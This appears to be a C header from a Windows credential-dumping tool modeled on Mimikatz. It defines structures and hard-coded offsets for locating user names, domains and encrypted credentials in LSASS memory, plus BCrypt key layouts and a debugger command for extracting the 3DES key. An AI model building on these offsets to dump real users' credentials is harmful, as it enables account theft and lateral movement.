#include <windows.h>
//#include <winternl.h>

typedef struct _CUSTOM_SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize; // extended version adds this
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    IO_COUNTERS IoCounters;
    SYSTEM_THREAD_INFORMATION Threads[1];
} CUSTOM_SYSTEM_PROCESS_INFORMATION, * PCUSTOM_SYSTEM_PROCESS_INFORMATION;


//
// Mimikatz Structures https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.h
//

// Members of the _KIWI_MSV1_0_LIST_63 struct // TO DO - paste the mimikatz structures here and use FIELD_OFFSET to get field offsets for different versions of Windows
#define LSA_UNICODE_STRING_UserName 0x90
#define LSA_UNICODE_STRING_Domain 0xA0
#define PSID_pSid 0xD0
#define PKIWI_MSV1_0_CREDENTIALS_Credentials 0x108

// Members of the PKIWI_MSV1_0_CREDENTIALS struct
#define PKIWI_MSV1_0_PRIMARY_CREDENTIALS_PrimaryCredentials 0x10

// Members of PKIWI_MSV1_0_PRIMARY_CREDENTIALS struct
#define ANSI_STRING_Primary 0x28
#define LSA_UNICODE_STRING_Credentials 0x30
#define Credentials_CryptoBlob_Length 0x1b0

// https://whoamianony.top/posts/sekurlsa-how-to-dump-user-login-credentials-from-msv1_0/#3-%E6%89%93%E5%8D%B0%E7%99%BB%E5%BD%95%E4%BC%9A%E8%AF%9D%E4%BF%A1%E6%81%AF
// .process /p /r ffffc20da8e68140; db poi(poi(lsasrv!h3DesKey)+0x10)+0x38
typedef struct _HARD_KEY {
    ULONG cbSecret;
    BYTE data[ANYSIZE_ARRAY]; // etc...
} HARD_KEY, * PHARD_KEY;

typedef struct _BCRYPT_KEY81 {
    ULONG size;
    ULONG tag;	// 'MSSK'
    ULONG type;
    ULONG unk0;
    ULONG unk1;
    ULONG unk2;
    ULONG unk3;
    ULONG unk4;
    PVOID unk5;	// before, align in x64
    ULONG unk6;
    ULONG unk7;
    ULONG unk8;
    ULONG unk9;
    HARD_KEY hardkey;
} BCRYPT_KEY81, * PBCRYPT_KEY81;

typedef struct _BCRYPT_HANDLE_KEY {
    ULONG size;
    ULONG tag;	// 'UUUR'
    PVOID hAlgorithm;
    PBCRYPT_KEY81 key;
    PVOID unk0;
} BCRYPT_HANDLE_KEY, * PBCRYPT_HANDLE_KEY;